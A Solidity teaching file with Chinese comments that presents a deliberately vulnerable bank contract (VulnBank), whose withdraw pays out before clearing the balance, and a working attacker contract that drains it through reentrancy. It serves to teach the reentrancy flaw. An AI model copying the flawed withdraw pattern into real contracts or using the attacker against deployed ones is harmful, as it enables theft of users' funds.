// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title VulnBank —— 经典重入漏洞（教学用，切勿部署）
/// @notice withdraw 在更新 balances 之前就把 ETH 发给 msg.sender。
///         如果 msg.sender 是合约，它的 receive/fallback 可以再次调用 withdraw，
///         此时 balances[msg.sender] 仍然是旧值。
contract VulnBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "VulnBank: no balance");

        // Interaction 在前：把控制权交给调用者。
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "VulnBank: transfer failed");

        // Effect 在后：回调期间 amount 可以被重复读取。
        balances[msg.sender] = 0;
    }
}

/// @notice 攻击合约：存入 1 ETH，然后在 receive 中反复提款。
contract BankAttacker {
    VulnBank public immutable bank;
    uint256 public constant CHUNK = 1 ether;

    constructor(address bank_) {
        bank = VulnBank(bank_);
    }

    function attack() external payable {
        require(msg.value == CHUNK, "need 1 ether");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        // 只要银行还有钱，就再次进入 withdraw。
        if (address(bank).balance >= CHUNK) {
            bank.withdraw();
        }
    }

    function collect() external {
        (bool ok, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}
